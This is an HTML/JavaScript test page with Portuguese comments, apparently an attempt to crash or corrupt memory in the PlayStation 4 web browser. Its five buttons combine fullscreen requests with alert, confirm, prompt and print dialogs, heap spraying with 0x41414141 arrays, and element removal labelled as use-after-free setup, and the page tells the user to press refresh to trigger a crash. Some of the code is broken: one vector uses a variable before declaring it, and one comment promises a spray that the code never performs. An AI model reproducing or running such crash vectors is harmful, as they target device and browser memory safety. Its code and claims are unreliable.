<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v540000: Modal Interruption</title>
<style>
    body { background: #000; color: #ff0; font-family: monospace; text-align: center; padding: 10px; }
    h1 { border-bottom: 2px solid #ff0; color: #fff; }
    .status { 
        border: 2px solid #fff; padding: 15px; margin-bottom: 20px; 
        font-size: 1.2em; background: #550; color: #fff; font-weight: bold;
    }
    .inst { font-size: 0.9em; color: #fff; margin-bottom: 15px; }
    
    button {
        display: block; width: 100%; padding: 25px; margin: 15px 0;
        background: #330; color: #fff; border: 2px solid #ff0;
        font-size: 20px; font-weight: bold; cursor: pointer; text-transform: uppercase;
    }
    button:hover { background: #ff0; color: #000; }
    
    #stage { background: #111; height: 50px; border: 1px solid #555; margin-top: 20px; }
</style>
</head>
<body>

<h1>v540000: MODAL INTERRUPTION</h1>

<div class="status" id="msg">
    ESTRATÉGIA: PAUSAR TRANSIÇÕES COM ALERTAS<br>
    OBJETIVO: CRASH AO ATUALIZAR (REFRESH)
</div>

<div class="inst">
    <b>INSTRUÇÃO MESTRA:</b><br>
    Se a tela travar, ficar preta ou o alerta não fechar:<br>
    APERTE O BOTÃO "ATUALIZAR" (REFRESH) NO CONTROLE!
</div>

<button onclick="modal_test(m01)">01. OnFullscreenChange Alert Freeze</button>

<button onclick="modal_test(m02)">02. Video Error Handler Alert</button>

<button onclick="modal_test(m03)">03. Recursive Confirm Fullscreen</button>

<button onclick="modal_test(m04)">04. Prompt Pointer Injection</button>

<button onclick="modal_test(m05)">05. Alert + Print Dialog Conflict</button>

<div id="stage">ALVO</div>

<script>
    const Stage = document.getElementById('stage');
    
    // Spray Global (Estabilidade)
    let memory = [];
    const spray = new Uint32Array(1024).fill(0x41414141);

    function modal_test(vectorFunc) {
        Stage.innerHTML = "";
        memory = [];
        
        // 1. Configura
        const target = vectorFunc(Stage);
        
        // 2. Pequeno delay e executa
        setTimeout(() => {
            if(target._run) target._run();
        }, 200);
    }

    // =================================================================
    // 01. OnFullscreenChange Alert Freeze
    // Tenta abrir um alerta EXATAMENTE no momento que a tela vira Fullscreen.
    // Isso pausa o navegador no estado "Transitioning".
    // =================================================================
    function m01(stage) {
        const d = document.createElement('div');
        d.innerText = "TRANSITION FREEZE";
        stage.appendChild(d);

        // O Evento Mágico
        document.onwebkitfullscreenchange = () => {
            // O navegador acabou de entrar em modo gráfico.
            // PAUSA TUDO AGORA.
            window.alert("⚠️ TRANSIÇÃO PAUSADA ⚠️\n\n1. Não clique OK ainda.\n2. Tente dar Refresh com isso na tela.\n3. Se não der, clique OK e dê Refresh.");
            
            // Depois do OK, destruímos o palco
            document.body.innerHTML = "<h1>MEMORY CORRUPTED</h1>";
            for(let i=0; i<5000; i++) memory.push(new Uint32Array(spray));
        };

        d._run = () => {
            // Inicia o processo
            if (document.body.webkitRequestFullscreen) document.body.webkitRequestFullscreen();
            else if (document.body.requestFullscreen) document.body.requestFullscreen();
        };
        return d;
    }

    // =================================================================
    // 02. Video Error Handler Alert
    // Cria um vídeo inválido. Quando o erro dispara, chamamos Fullscreen + Alerta.
    // Mistura driver de mídia, tratamento de erro e UI.
    // =================================================================
    function m02(stage) {
        const v = document.createElement('video');
        stage.appendChild(v);

        v.onerror = () => {
            // Erro detectado.
            // Tenta Fullscreen num vídeo quebrado
            try {
                if (v.webkitRequestFullscreen) v.webkitRequestFullscreen();
                else if (v.requestFullscreen) v.requestFullscreen();
            } catch(e){}
            
            // Imediatamente lança o alerta para travar o tratamento de erro
            window.alert("⚠️ MEDIA ERROR TRAP ⚠️\n\nO driver de vídeo falhou.\nPrepare para atualizar.");
            
            // Cleanup violento
            v.remove();
        };

        d._run = () => {
            v.src = "invalid_video_file.mp4"; // Força erro
        };
        // Hack para retornar o objeto correto com _run
        const d = { _run: () => { v.onerror(); } }; 
        return d;
    }

    // =================================================================
    // 03. Recursive Confirm Fullscreen
    // Pede confirmação. Se "Sim", pede Fullscreen E abre outra confirmação.
    // Cria uma pilha de modais em cima do modo gráfico.
    // =================================================================
    function m03(stage) {
        const d = document.createElement('div');
        d.innerText = "CONFIRM STACK";
        stage.appendChild(d);

        d._run = () => {
            const r1 = window.confirm("ETAPA 1:\nDeseja iniciar o Fullscreen?");
            if(r1) {
                // Solicita Fullscreen
                if (document.body.webkitRequestFullscreen) document.body.webkitRequestFullscreen();
                else if (document.body.requestFullscreen) document.body.requestFullscreen();
                
                // IMEDIATAMENTE abre outro modal (Bloqueia a thread)
                // O navegador tem que desenhar o Fullscreen E a caixa de diálogo ao mesmo tempo
                window.confirm("ETAPA 2 (CRÍTICA):\n\nAperte 'ATUALIZAR' agora!\nNão feche esta caixa.");
                
                // Se o usuário fechar, spray
                document.body.innerHTML = "DEAD";
            }
        };
        return d;
    }

    // =================================================================
    // 04. Prompt Pointer Injection
    // Usa o prompt para alocar uma string e tenta usá-la como
    // parâmetro para uma chamada de Fullscreen (que vai falhar, mas mexe na memória).
    // =================================================================
    function m04(stage) {
        const d = document.createElement('div');
        d.innerText = "PROMPT INJECT";
        stage.appendChild(d);

        d._run = () => {
            // Pede dados ao usuário. Isso aloca memória no Kernel.
            // Digite "AAAA" se quiser testar.
            const user_data = window.prompt("INJEÇÃO DE MEMÓRIA:\nDigite qualquer coisa e clique OK.", "AAAAAAAAAAAAAAAAAAAA");
            
            if(user_data) {
                // Tenta associar essa string ao elemento
                d.setAttribute("data-spray", user_data);
                
                // Chama Fullscreen
                if (d.webkitRequestFullscreen) d.webkitRequestFullscreen();
                else if (d.requestFullscreen) d.requestFullscreen();
                
                // Alerta final para segurar o estado
                window.alert("⚠️ MEMORY HELD ⚠️\n\nA string está na memória.\nAtualize a página agora.");
                
                // Libera a referência (UAF Setup)
                d.remove();
            }
        };
        return d;
    }

    // =================================================================
    // 05. The Double Tap (Alert + Print Dialog)
    // window.print() abre uma caixa de sistema. window.alert() também.
    // Tentar abrir os dois ao mesmo tempo em Fullscreen é caótico.
    // =================================================================
    function m05(stage) {
        const d = document.createElement('div');
        d.innerText = "UI CONFLICT";
        stage.appendChild(d);

        d._run = () => {
            // 1. Fullscreen
            if (document.body.webkitRequestFullscreen) document.body.webkitRequestFullscreen();
            else if (document.body.requestFullscreen) document.body.requestFullscreen();
            
            // 2. Tenta imprimir (Isso pausa o script para gerar preview)
            // O PS4 pode não suportar print, mas a chamada da API existe.
            try { window.print(); } catch(e){}
            
            // 3. Alerta Imediato
            window.alert("⚠️ UI CONFLICT ⚠️\n\nO sistema tentou abrir diálogo de impressão?\nAtualize a página.");
            
            // Nuke
            document.body.innerHTML = "";
        };
        return d;
    }

</script>
</body>
</html>
